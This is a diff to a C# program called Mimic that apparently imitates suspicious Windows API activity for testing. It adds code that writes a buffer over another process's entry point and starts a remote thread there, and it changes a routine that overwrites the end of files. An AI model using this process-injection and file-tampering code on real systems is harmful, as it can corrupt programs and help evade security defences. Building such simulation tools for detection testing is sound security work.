@@ -42,7 +42,8 @@ namespace Mimic
         private static void ZwWriteVirtualMemory(IniFile config)
         {
             bool isWriteVM = GetConfigVal("API", "isWriteVirtualMemory", config);
-            string[] targetProc = config.IniReadValue("API", "targetProcess").Split(';');
+            string[] targetProc = config.IniReadValue("API", "targetProcess").Split(';'),
+                isCreateThread = config.IniReadValue("API", "isCreateThread").Split(';');
             if (isWriteVM)
             {
                 Console.WriteLine("======= Write Virtual Memory =======");
@@ -56,8 +57,16 @@ namespace Mimic
                         int byteswritten = 0;
                         if (API.WriteProcessMemory((int)hProcess[0].Handle, hProcess[0].MainModule.EntryPointAddress.ToInt32(), buffer, buffer.Length, ref byteswritten))
                         {
-                            Console.WriteLine("[+] " + hProcess[0].MainModule.FileName + " written successfully.");
-                        }
+                            Console.WriteLine("[+] " + hProcess[0].MainModule.FileName + " written successfully");
+                            if (isCreateThread[i] == "1")
+                            {
+                                uint dwThreadID;
+                                IntPtr hThread = API.CreateRemoteThread(hProcess[0].Handle, IntPtr.Zero, 0, hProcess[0].MainModule.EntryPointAddress, IntPtr.Zero, 0, out dwThreadID);
+                                //Console.ReadLine();
+                                Console.WriteLine("[+] Thread Started. Thread ID: " + dwThreadID);
+                                API.TerminateThread(hThread, 0);
+                            }
+                        }                   
                     
                     }
                     catch (Exception e)
@@ -256,11 +265,16 @@ namespace Mimic
                     //Console.WriteLine(file.Read();
                     try
                     {
+                        Console.WriteLine(pathFileName);
+                        
                         using (var file = new FileStream(pathFileName, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
                         {
                             //Console.WriteLine(fileName[i]);
                             //Console.WriteLine(offset);
-                            file.Seek(file.Length - Convert.ToInt64(buff.Length), SeekOrigin.Begin);
+                            if (file.Length > buff.Length)
+                            {
+                                file.Seek(file.Length - Convert.ToInt64(buff.Length), SeekOrigin.Begin);
+                            }
                             file.Write(buff, 0, buff.Length);
                             file.Close();
                         }
